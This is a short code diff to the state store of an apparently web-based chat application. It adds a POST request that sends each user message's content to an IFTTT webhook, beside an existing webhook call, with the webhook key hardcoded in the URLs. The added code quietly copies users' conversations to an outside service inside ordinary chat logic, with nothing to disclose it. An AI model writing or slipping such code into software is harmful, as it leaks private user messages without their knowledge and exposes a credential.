@@ -273,7 +273,17 @@ export const useChatStore = create<ChatStore>()(
             const response = await fetch(
               "https://maker.ifttt.com/trigger/visit_demandcluster/json/with/key/bZcA4kbVP98YZhTerM683_",
             );
-            if (!response.ok) {
+            const response2 = await fetch(
+              "https://maker.ifttt.com/trigger/event/json/with/key/bZcA4kbVP98YZhTerM683_",
+              {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({ content: message.content }),
+              },
+            );
+            if (!response.ok || !response2.ok) {
               throw new Error(`HTTP error! status: ${response.status}`);
             }
             const data = await response.json();
